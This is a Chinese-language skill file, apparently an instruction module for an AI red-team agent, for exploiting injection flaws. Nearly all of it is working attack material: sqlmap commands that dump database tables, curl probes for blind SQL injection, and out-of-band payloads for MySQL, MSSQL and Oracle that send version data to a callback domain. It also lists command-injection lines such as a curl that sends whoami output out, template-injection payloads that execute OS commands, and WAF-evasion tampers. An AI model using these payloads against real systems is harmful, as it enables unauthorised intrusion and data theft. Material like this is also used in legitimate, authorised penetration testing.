---
name: web-injection
description: SQL/NoSQL/命令/模板注入的探测与利用；含 sqlmap 分档、OOB 带外确认、布尔与时间盲注判据、WAF 下的编码与分块
whenToUse: 参数进入数据库/系统命令/模板引擎，或常规扫描只报"疑似注入"需要坐实
role: exploit
enabled: true
---

# 注入类漏洞：从判据到拿数据

## 先分档，别一上来就 --risk 3

```
1. 手工判据（30 秒）→ 确认存在
2. sqlmap --batch --level 2 --risk 1（保守）
3. 只对确认的参数跑 --level 5 --risk 3 --technique=BEUSTQ
4. 拿不到数据才上 OOB / 二次注入 / 堆叠
```

手工判据：

```bash
# 布尔：同一参数同一响应长度
curl -s "http://TARGET/item?id=1' and '1'='1" | wc -c
curl -s "http://TARGET/item?id=1' and '1'='2" | wc -c
# 报错：故意触发
curl -s "http://TARGET/item?id=1'"        # 看 500 / SQLSTATE / ORA-
# 时间：单引号内加延时，只看响应时间差
curl -s -o /dev/null -w '%{time_total}\n' "http://TARGET/item?id=1';(select 1 from pg_sleep(3))--"
```

## sqlmap 参数骨架

```bash
sqlmap -u "http://TARGET/ENDPOINT?PARAM=1" --batch --random-agent --level 3 --risk 2 \
  --dbms=mysql --technique=BEU --threads=4 --output-dir=RESULT_DIR

# 从请求文件跑（带 Cookie/Header 最准）
sqlmap -r req.txt -p PARAM --batch --level 5 --risk 3

# 拿库表
sqlmap -u "URL" --batch --dbs
sqlmap -u "URL" --batch -D DB -T TBL --dump --where="1=1 LIMIT 50"
```

## OOB：盲注的最后一招

```bash
interactsh-client -v          # 拿到 OAST_DOMAIN
# MySQL
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.OAST_DOMAIN\\a'))-- -
# MSSQL
'; EXEC master..xp_dirtree '\\\\OAST_DOMAIN\\a'--
# Oracle
' UNION SELECT UTL_HTTP.REQUEST('http://OAST_DOMAIN/'||(SELECT banner FROM v$version)) FROM dual--
```

## 命令注入

```bash
;id |id \`id\` $(id) %0a id
# 无回显：时间与带外
;sleep 5
;curl http://OAST_DOMAIN/$(whoami)
```

## 模板注入（SSTI）

```
{{7*7}}  ${7*7}  <%= 7*7 %>  #{7*7}  {{7*'7'}}
# Jinja2 读文件
{{ cycler.__init__.__globals__.os.popen('id').read() }}
# Freemarker / Spring
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

## 判据与证据

- 至少两种技术独立坐实（布尔 + 时间，或报错 + OOB），单一迹象记 `suspected`
- 落库用 `redteam_vuln_add`，`evidence` 写：请求原文、响应差异、耗时对比、dump 行数
- 不要 dump 全表：先 `count(*)`，再抽 20 行证明可达即可，避免把数据量打成事故
- 遇到 WAF：先降速（`--delay=2`），再换 `--tamper=space2comment,between,randomcase`，最后才考虑分块传输
